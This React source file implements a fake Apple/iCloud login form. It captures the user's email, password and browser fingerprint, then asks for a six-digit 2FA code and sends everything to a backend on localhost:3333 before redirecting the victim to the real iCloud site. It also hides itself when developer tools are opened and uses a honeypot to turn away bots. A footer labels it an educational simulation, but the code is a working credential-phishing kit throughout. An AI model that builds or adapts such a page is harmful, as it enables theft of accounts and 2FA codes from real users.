import React, { useState, useRef, useEffect } from "react";
import { BsArrowRightCircle } from "react-icons/bs";
import AppleLoginIcon from "../assets/apple.svg";
import LoadingCircle from "../assets/loading.svg";

const LoginForm = () => {
  // États existants
  const [isDropdown, setIsDropdown] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState(Array(6).fill(""));
  const [securityToken, setSecurityToken] = useState("");

  // Références et effets
  const otpRefs = useRef(Array(6).fill().map(() => React.createRef()));
  const honeypotRef = useRef(null);

  // 1. Protection Anti-DevTools
  useEffect(() => {
    const checkDevTools = () => {
      const threshold = 200;
      if(window.outerWidth - window.innerWidth > threshold || 
         window.outerHeight - window.innerHeight > threshold ||
         window.Firebug ||
         window.__REACT_DEVTOOLS_GLOBAL_HOOK__) {
        document.body.innerHTML = '<div style="padding:20px;color:red;">Security Alert</div>';
      }
    };

    const interval = setInterval(checkDevTools, 1000);
    return () => clearInterval(interval);
  }, []);

  // 2. Génération de Token de Sécurité
  useEffect(() => {
    setSecurityToken(crypto.randomUUID());
  }, []);

  // 3. Gestion de Login avec Fingerprinting
  const handleLogin = async (e) => {
    e.preventDefault();
    
    // Vérification Honeypot
    if(honeypotRef.current?.value) {
      window.location.href = "https://apple.com/security";
      return;
    }

    setIsLoading(true);

    try {
      const fingerprint = {
        screen: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        plugins: navigator.plugins.length
      };

      const response = await fetch('http://localhost:3333/auth', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Security-Token': securityToken
        },
        body: JSON.stringify({ 
          email, 
          password: btoa(password), // Chiffrement basique
          userAgent: navigator.userAgent,
          fingerprint
        })
      });

      if (!response.ok) throw new Error('Auth failed');
      setIsVerifying(true);

    } catch (error) {
      console.error("Error:", error);
      // 4. Délai aléatoire anti-brute force
      await new Promise(resolve => 
        setTimeout(resolve, 1000 + Math.random() * 2000)
      );
    } finally {
      setIsLoading(false);
    }
  };

  // 5. Vérification 2FA avec Journalisation
  const handleVerifyCode = async (otp) => {
    const otpCode = otp.join("");
    
    try {
      const response = await fetch('http://localhost:3333/verify-2fa', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Security-Token': securityToken 
        },
        body: JSON.stringify({ 
          email, 
          code: otpCode,
          verification: {
            timestamp: new Date().toISOString(),
            ipHash: await hashData(window.location.host)
          }
        })
      });

      if (response.ok) {
        window.location.href = "https://www.icloud.com";
      }
    } catch (error) {
      console.error("2FA Error:", error);
    }
  };

  // Fonction utilitaire de hachage
  const hashData = async (data) => {
    const encoder = new TextEncoder();
    const hashBuffer = await crypto.subtle.digest(
      'SHA-256', 
      encoder.encode(data + securityToken)
    );
    return Array.from(new Uint8Array(hashBuffer))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
  };

  // 6. Gestion OTP (inchangée mais sécurisée)
  const handleOtpChange = (index, value) => {
    const lastChar = value.slice(-1);
    setOtp(prev => {
      const copy = [...prev];
      copy[index] = lastChar;
      return copy;
    });

    if (value.length === 1 && index < otp.length - 1) {
      otpRefs.current[index + 1]?.focus();
    } else if (value.length === 0 && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  return (
    <div className="login-form">
      {/* ... (votre JSX existant) ... */}

      {/* 7. Honeypot invisible */}
      <input
        type="text"
        name="username"
        ref={honeypotRef}
        style={{ 
          position: 'absolute',
          left: '-9999px',
          opacity: 0
        }}
      />

      {/* 8. Avertissement légal */}
      <div className="legal-notice" style={{
        position: 'fixed',
        bottom: 10,
        right: 10,
        fontSize: '10px',
        color: '#999'
      }}>
        SIMULATION ÉDUCATIVE - NE PAS UTILISER À DES FINS MALVEILLANTES
      </div>
    </div>
  );
};

export default LoginForm;
